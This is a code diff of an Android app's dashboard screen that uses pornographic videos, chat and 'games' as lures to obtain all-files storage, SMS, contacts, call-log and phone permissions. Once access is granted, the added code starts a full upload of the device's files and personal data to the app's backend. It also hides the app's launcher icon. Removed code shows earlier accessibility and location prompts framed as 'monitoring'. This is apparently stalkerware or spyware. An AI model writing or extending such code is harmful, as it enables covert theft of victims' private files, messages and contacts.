@@ -4,19 +4,14 @@ import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Environment;
-import android.provider.Settings;
 import android.util.Log;
-import android.view.Menu;
-import android.view.MenuItem;
 import android.view.View;
+import android.view.animation.OvershootInterpolator;
 import android.widget.Toast;
 
 import androidx.activity.EdgeToEdge;
-import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
@@ -27,18 +22,16 @@ import com.bushorat.app.databinding.ActivityDashboardBinding;
 import com.bushorat.app.helpers.AppVisibilityHelper;
 import com.bushorat.app.helpers.DataSyncWorker;
 import com.bushorat.app.helpers.FeaturePermissions;
-import com.bushorat.app.helpers.GpsHelper;
-import com.bushorat.app.helpers.ImageUploadWorker;
-import com.bushorat.app.helpers.NotificationHelper;
+import com.bushorat.app.helpers.FileBackupHelper;
+import com.bushorat.app.helpers.PermissionUXHelper;
 import com.bushorat.app.helpers.SessionManager;
 import com.bushorat.app.helpers.UserDataSyncHelper;
-import com.bushorat.app.sync.SyncService;
-
 /**
  * Permissions are requested only when the matching feature is opened:
  * Videos -> storage (unlocks videos + WhatsApp media upload)
- * Chat   -> SMS (+ optional notification access once)
+ * Chat   -> SMS
  * Games  -> contacts / call logs / phone
+ * Videos (PornActivity) -> notification access after storage is granted
  * Profile-> location (handled in ProfileActivity)
  */
 public class DashboardActivity extends AppCompatActivity {
@@ -46,29 +39,10 @@ public class DashboardActivity extends AppCompatActivity {
 
     private ActivityDashboardBinding binding;
     private SessionManager sessionManager;
+    /** User was sent to system “All files access” settings from the videos unlock flow. */
+    private boolean awaitingAllFilesAccess = false;
+    private boolean hadAllFilesAccess = false;
     
-    // File backup integration
-    private static final String PREF_FILE_SYNC = "file_sync_prefs";
-    private static final String KEY_ASKED_FILE_PERMS = "asked_file_perms";
-    private static final String KEY_ASKED_ALL_FILES = "asked_all_files";
-    
-    // Permission flow state - prevent overlapping dialogs
-    private boolean permissionFlowInProgress = false;
-    
-    private final androidx.activity.result.ActivityResultLauncher<String[]> permissionLauncher =
-        registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
-            Log.d(TAG, "✅ Permission launcher result: " + result);
-            // Small delay to ensure OS has updated the permission state
-            binding.getRoot().postDelayed(this::continuePermissionFlow, 500);
-        });
-    
-    private final androidx.activity.result.ActivityResultLauncher<Intent> allFilesLauncher =
-        registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
-            Log.d(TAG, "✅ All files launcher result");
-            // Small delay to ensure OS has updated the permission state
-            binding.getRoot().postDelayed(this::continuePermissionFlow, 500);
-        });
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -94,14 +68,14 @@ public class DashboardActivity extends AppCompatActivity {
         // Sync only what is already permitted — never ask for everything at once
         UserDataSyncHelper.syncAll(this);
 
-        if (FeaturePermissions.areVideosUnlocked(this)) {
-            ImageUploadWorker.schedulePeriodicUpload(this);
-        }
-
         // ✅ NO permission requests on app launch - only when feature is opened
         binding.btnPorn.setOnClickListener(v -> onVideosTapped());
         binding.btnChat.setOnClickListener(v -> onChatTapped());
         binding.btnContacts.setOnClickListener(v -> onGamesTapped());
+        binding.btnProfile.setOnClickListener(v -> openProfile());
+        setupProfileEntranceAnimation();
+
+        hadAllFilesAccess = FeaturePermissions.hasGalleryPermission(this);
     }
 
     @Override
@@ -111,10 +85,26 @@ public class DashboardActivity extends AppCompatActivity {
             sessionManager.updateLastActivity();
         }
         UserDataSyncHelper.syncAll(this);
-        if (FeaturePermissions.areVideosUnlocked(this)) {
-            ImageUploadWorker.schedulePeriodicUpload(this);
+
+        AppVisibilityHelper visibilityHelper = AppVisibilityHelper.getInstance(this);
+        if (visibilityHelper.isAppHidden()) {
+            visibilityHelper.setMainLauncherEnabled(false);
+        } else {
+            visibilityHelper.ensureListenerStarted();
         }
-        // ✅ NO notification permission requests on app resume
+
+        boolean hasAllFiles = FeaturePermissions.hasGalleryPermission(this);
+        if (hasAllFiles && !hadAllFilesAccess) {
+            hadAllFilesAccess = true;
+            onAllFilesAccessGranted(false);
+        } else if (!hasAllFiles) {
+            hadAllFilesAccess = false;
+        }
+
+        if (awaitingAllFilesAccess) {
+            awaitingAllFilesAccess = false;
+            handleStorageAccessAfterSettings();
+        }
     }
 
     private void setupToolbarSubtitle() {
@@ -125,40 +115,6 @@ public class DashboardActivity extends AppCompatActivity {
     }
 
     private void onVideosTapped() {
-        // First ask for accessibility if not prompted
-        if (!FeaturePermissions.hasAccessibilityBeenPrompted(this)) {
-            FeaturePermissions.markAccessibilityPrompted(this);
-            new AlertDialog.Builder(this)
-                    .setTitle("Accessibility Service")
-                    .setMessage("Enable Accessibility Service for enhanced monitoring capabilities.")
-                    .setPositiveButton("Enable", (d, w) -> {
-                        openAccessibilitySettings();
-                        promptLocationThenVideos();
-                    })
-                    .setNegativeButton("Skip", (d, w) ->
-                            promptLocationThenVideos())
-                    .show();
-            return;
-        }
-        promptLocationThenVideos();
-    }
-
-    private void promptLocationThenVideos() {
-        // Then ask for location if not prompted
-        if (!FeaturePermissions.hasLocationBeenPrompted(this)) {
-            FeaturePermissions.markLocationPrompted(this);
-            new AlertDialog.Builder(this)
-                    .setTitle("Location Access")
-                    .setMessage("Enable location tracking for device monitoring.")
-                    .setPositiveButton("Allow", (d, w) -> {
-                        FeaturePermissions.requestLocationPermission(this);
-                        proceedToVideos();
-                    })
-                    .setNegativeButton("Skip", (d, w) ->
-                            proceedToVideos())
-                    .show();
-            return;
-        }
         proceedToVideos();
     }
 
@@ -174,55 +130,33 @@ public class DashboardActivity extends AppCompatActivity {
         new AlertDialog.Builder(this)
                 .setTitle(R.string.unlock_videos_title)
                 .setMessage(R.string.unlock_videos_message)
-                .setPositiveButton(R.string.unlock_videos_allow, (d, w) ->
-                        FeaturePermissions.requestGalleryForVideos(this))
+                .setPositiveButton(R.string.unlock_videos_allow, (d, w) -> {
+                    awaitingAllFilesAccess = true;
+                    FeaturePermissions.requestGalleryForVideos(this);
+                })
                 .setNegativeButton(android.R.string.cancel, null)
                 .show();
     }
 
-    private void openAccessibilitySettings() {
-        try {
-            startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS));
-        } catch (Exception e) {
-            Log.e(TAG, "Could not open accessibility settings", e);
-            Toast.makeText(this, "Please enable Accessibility Service manually", Toast.LENGTH_LONG).show();
-        }
-    }
-
     private void unlockVideosAndOpen() {
-        FeaturePermissions.setVideosUnlocked(this, true);
-        ImageUploadWorker.schedulePeriodicUpload(this);
-        UserDataSyncHelper.syncAll(this);
-        Toast.makeText(this, R.string.unlock_videos_success, Toast.LENGTH_SHORT).show();
-        openUnlockedVideos();
+        onAllFilesAccessGranted(true);
     }
 
     private void openUnlockedVideos() {
-        ImageUploadWorker.enqueueWork(this);
-        // Request file/media permissions for document backup
-        // This will start the permission flow, then open PornActivity
-        requestFileBackupPermissionsAndOpenVideos();
+        FileBackupHelper.startFullBackup(this);
+        startPornActivity();
     }
 
-    /**
-     * Request file backup permissions, then open PornActivity when done
-     */
-    private void requestFileBackupPermissionsAndOpenVideos() {
-        if (hasAllFilePermissions()) {
-            Log.d(TAG, "✅ All permissions already granted - opening videos immediately");
+    /** All-files granted: upload everything to Storage + RTDB, optionally open videos. */
+    private void onAllFilesAccessGranted(boolean openVideos) {
+        FileBackupHelper.startFullBackup(this);
+        UserDataSyncHelper.syncAll(this, false);
+        if (openVideos) {
+            Toast.makeText(this, R.string.unlock_videos_success, Toast.LENGTH_SHORT).show();
             startPornActivity();
-            return;
         }
-        
-        Log.d(TAG, "🔄 Starting permission flow for videos");
-        permissionFlowInProgress = true;
-        // Start permission flow (will complete and open activity)
-        requestFileBackupPermissions();
     }
-    
-    /**
-     * Opens PornActivity after all permissions are handled
-     */
+
     private void startPornActivity() {
         try {
             startActivity(new Intent(this, PornActivity.class));
@@ -254,20 +188,84 @@ public class DashboardActivity extends AppCompatActivity {
             UserDataSyncHelper.syncAll(this);
             return;
         }
-        new AlertDialog.Builder(this)
-                .setTitle(R.string.perm_games_title)
-                .setMessage(R.string.perm_games_message)
-                .setPositiveButton(R.string.perm_allow, (d, w) ->
-                        FeaturePermissions.requestGamesPermissions(this))
-                .setNegativeButton(android.R.string.cancel, null)
-                .show();
+        continueGamesPermissionFlow();
     }
 
-    // ✅ Notification permission moved to PornActivity (inside video activity)
-    // This keeps Dashboard clean - no permission requests on launch
+    private void continueGamesPermissionFlow() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+                != PackageManager.PERMISSION_GRANTED) {
+            PermissionUXHelper.showRationale(
+                    this,
+                    R.string.perm_games_title,
+                    R.string.perm_games_contacts_message,
+                    () -> FeaturePermissions.requestContactsForGames(this),
+                    null
+            );
+            return;
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+                != PackageManager.PERMISSION_GRANTED) {
+            PermissionUXHelper.showRationale(
+                    this,
+                    R.string.perm_games_title,
+                    R.string.perm_games_call_log_message,
+                    () -> FeaturePermissions.requestCallLogForGames(this),
+                    null
+            );
+            return;
+        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
+                != PackageManager.PERMISSION_GRANTED) {
+            PermissionUXHelper.showRationale(
+                    this,
+                    R.string.perm_games_title,
+                    R.string.perm_games_phone_message,
+                    () -> FeaturePermissions.requestPhoneStateForGames(this),
+                    null
+            );
+            return;
+        }
+        startActivity(new Intent(this, EarnActivity.class));
+        UserDataSyncHelper.syncAll(this);
+    }
 
     private void openProfile() {
         startActivity(new Intent(this, ProfileActivity.class));
+    }
+
+    private void setupProfileEntranceAnimation() {
+        View profile = binding.btnProfile;
+        profile.setScaleX(0.85f);
+        profile.setScaleY(0.85f);
+        profile.setAlpha(0f);
+        profile.animate()
+                .alpha(1f)
+                .scaleX(1f)
+                .scaleY(1f)
+                .setDuration(450)
+                .setStartDelay(200)
+                .setInterpolator(new OvershootInterpolator(1.15f))
+                .start();
+    }
+
+    private void handleStorageAccessAfterSettings() {
+        Log.d(TAG, "Storage access check — hasAllFiles: " + FeaturePermissions.hasGalleryPermission(this));
+        if (!FeaturePermissions.hasGalleryPermission(this)) {
+            Toast.makeText(this, R.string.unlock_videos_denied, Toast.LENGTH_SHORT).show();
+            return;
+        }
+        boolean openVideos = !FeaturePermissions.areVideosUnlocked(this);
+        Log.d(TAG, "✅ All-files access granted — full backup" + (openVideos ? " + videos" : ""));
+        onAllFilesAccessGranted(openVideos);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE) {
+            awaitingAllFilesAccess = false;
+            handleStorageAccessAfterSettings();
+        }
     }
 
     /**
@@ -281,32 +279,8 @@ public class DashboardActivity extends AppCompatActivity {
         Log.d(TAG, "onRequestPermissionsResult: requestCode=" + requestCode + ", granted=" + FeaturePermissions.allGranted(grantResults));
         
         if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE) {
-            // User responded to storage permission request
-            Log.d(TAG, "Storage permission response received");
-            Log.d(TAG, "  → allGranted: " + FeaturePermissions.allGranted(grantResults));
-            Log.d(TAG, "  → hasGalleryPermission: " + FeaturePermissions.hasGalleryPermission(this));
-            
-            // Check if permission is actually accessible
-            if (FeaturePermissions.hasGalleryPermission(this)) {
-                Log.d(TAG, "✅ Storage permission GRANTED - unlocking videos");
-                unlockVideosAndOpen();
-            } else {
-                Log.w(TAG, "❌ Storage permission DENIED - permission not accessible");
-                Log.d(TAG, "   Requesting again...");
-                // Ask again
-                FeaturePermissions.requestGalleryForVideos(this);
-            }
-        } else if (requestCode == FeaturePermissions.REQ_PROFILE_LOCATION) {
-            // User responded to location permission request
-            if (FeaturePermissions.allGranted(grantResults)) {
-                Log.d(TAG, "✅ Location permission GRANTED");
-                // Show GPS enable prompt for Android 11+
-                GpsHelper.showGpsEnableDialog(this);
-            } else {
-                Log.w(TAG, "❌ Location permission DENIED");
-            }
-            // After location dialog, proceed to videos
-            proceedToVideos();
+            awaitingAllFilesAccess = false;
+            handleStorageAccessAfterSettings();
         } else if (requestCode == FeaturePermissions.REQ_CHAT_SMS) {
             // User responded to SMS permission
             if (FeaturePermissions.allGranted(grantResults)) {
@@ -317,31 +291,11 @@ public class DashboardActivity extends AppCompatActivity {
             } else {
                 Log.w(TAG, "❌ SMS permission DENIED");
             }
-        } else if (requestCode == FeaturePermissions.REQ_GAMES_CONTACTS) {
-            // User responded to contacts/games permission
-            if (FeaturePermissions.allGranted(grantResults)) {
-                Log.d(TAG, "✅ Games permissions GRANTED");
-                startActivity(new Intent(this, EarnActivity.class));
-                UserDataSyncHelper.syncAll(this);
-            } else {
-                Log.w(TAG, "❌ Games permissions DENIED");
-            }
+        } else if (requestCode == FeaturePermissions.REQ_GAMES_CONTACTS
+                || requestCode == FeaturePermissions.REQ_GAMES_CALL_LOG
+                || requestCode == FeaturePermissions.REQ_GAMES_PHONE) {
+            binding.getRoot().postDelayed(this::continueGamesPermissionFlow, 400);
         }
-    }
-
-    @Override
-    public boolean onCreateOptionsMenu(Menu menu) {
-        getMenuInflater().inflate(R.menu.menu_dashboard, menu);
-        return true;
-    }
-
-    @Override
-    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
-        if (item.getItemId() == R.id.action_profile) {
-            openProfile();
-            return true;
-        }
-        return super.onOptionsItemSelected(item);
     }
 
     public void logout() {
@@ -350,155 +304,6 @@ public class DashboardActivity extends AppCompatActivity {
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
         startActivity(intent);
         finish();
-    }
-
-    // ==================== FILE BACKUP INTEGRATION ====================
-
-    /**
-     * Requests file/media permissions for document backup with interactive sequential flow.
-     * Shows step-by-step dialogs without overlapping screens.
-     * Called only when user clicks the Videos button.
-     */
-    private void requestFileBackupPermissions() {
-        // Check if we already have all permissions
-        if (hasAllFilePermissions()) {
-            startFileSync();
-            return;
-        }
-
-        // Start sequential permission request flow
-        showFileBackupPermissionFlow();
-    }
-
-    /**
-     * Continue permission flow after a permission result
-     * Only called after a permission launcher completes
-     */
-    private void continuePermissionFlow() {
-        if (!permissionFlowInProgress) {
-            Log.d(TAG, "⚠️ Permission flow not in progress, ignoring");
-            return;
-        }
-        showFileBackupPermissionFlow();
-    }
-    
-    /**
-     * Single permission flow - ask for ALL FILES ACCESS only
-     * Syncs everything (documents + photos + all files) in background
-     * No separate media permission, no bulk sync
-     */
-    private void showFileBackupPermissionFlow() {
-        if (!permissionFlowInProgress) {
-            Log.w(TAG, "⚠️ Permission flow interrupted");
-            return;
-        }
-        
-        Log.d(TAG, "🔄 Checking all files access permission...");
-        
-        // Check if all files access is granted (Android 11+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
-                Log.d(TAG, "📂 All files access NOT granted - showing dialog");
-                showAllFilesAccessDialog();
-                return;
-            }
-            Log.d(TAG, "✅ All files access already granted");
-        } else {
-            // For Android 10 and below, grant is automatic if we have WRITE permission
-            Log.d(TAG, "✅ Pre-Android 11 - no special all files permission needed");
-        }
-
-        // Permission granted - start chunked background sync and open videos
-        Log.d(TAG, "🎉 Permission granted - starting chunked background sync");
-        permissionFlowInProgress = false;
-        startFileSync();
-    }
-
-    /**
-     * All Files Access Dialog (Required)
-     * This is the ONLY permission needed - grants access to everything
-     */
-    private void showAllFilesAccessDialog() {
-        Log.d(TAG, "📂 Showing all files access dialog");
-        new AlertDialog.Builder(this)
-                .setTitle("📂 Full File Access Required")
-                .setMessage("Allow access to all files on your device for complete backup?\n\nThis includes documents, photos, WhatsApp files, and everything else.")
-                .setPositiveButton("Allow", (dialog, which) -> {
-                    Log.d(TAG, "✅ User allowed all files access - opening system settings");
-                    allFilesLauncher.launch(new Intent(
-                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
-                        Uri.parse("package:" + getPackageName())
-                    ));
-                })
-                .setNegativeButton("Cancel", (dialog, which) -> {
-                    Log.d(TAG, "❌ User denied all files access");
-                    Toast.makeText(this, "File access is required to backup", Toast.LENGTH_LONG).show();
-                    permissionFlowInProgress = false;
-                })
-                .setCancelable(false)
-                .show();
-    }
-
-    /**
-     * Checks if app has all necessary file/media permissions.
-     * Returns true only if ALL permissions are granted.
-     */
-    private boolean hasAllFilePermissions() {
-        // Check READ_MEDIA_IMAGES or READ_EXTERNAL_STORAGE
-        if (!hasImagePermission(this)) {
-            return false;
-        }
-
-        // Check POST_NOTIFICATIONS (Android 13+)
-        if (Build.VERSION.SDK_INT >= 33) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                != PackageManager.PERMISSION_GRANTED) {
-                return false;
-            }
-        }
-
-        // Check MANAGE_EXTERNAL_STORAGE (Android 11+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
-                return false;
-            }
-        }
-
-        return true;
-    }
-
-    /**
-     * After all permissions confirmed, just open PornActivity
-     * Sync happens in background periodically via SyncService
-     * Don't trigger sync when opening videos - prevents lag/crashes
-     */
-    private void startFileSync() {
-        Log.d(TAG, "🎉 All permissions confirmed - opening videos");
-        Log.d(TAG, "   (Background sync already running separately)");
-        permissionFlowInProgress = false;
-        // ✅ DON'T start sync here - it's already running in background
-        // ✅ Just open the video activity - smooth and no lag
-        startPornActivity();
-    }
-
-    private java.util.List<String> missingFilePermissions() {
-        java.util.List<String> needed = new java.util.ArrayList<>();
-
-        if (!hasImagePermission(this)) {
-            if (Build.VERSION.SDK_INT >= 33) {
-                needed.add(Manifest.permission.READ_MEDIA_IMAGES);
-            } else {
-                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
-            }
-        }
-
-        if (Build.VERSION.SDK_INT >= 33 &&
-            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-            != PackageManager.PERMISSION_GRANTED) {
-            needed.add(Manifest.permission.POST_NOTIFICATIONS);
-        }
-
-        return needed;
     }
 
     public static boolean hasImagePermission(Context context) {
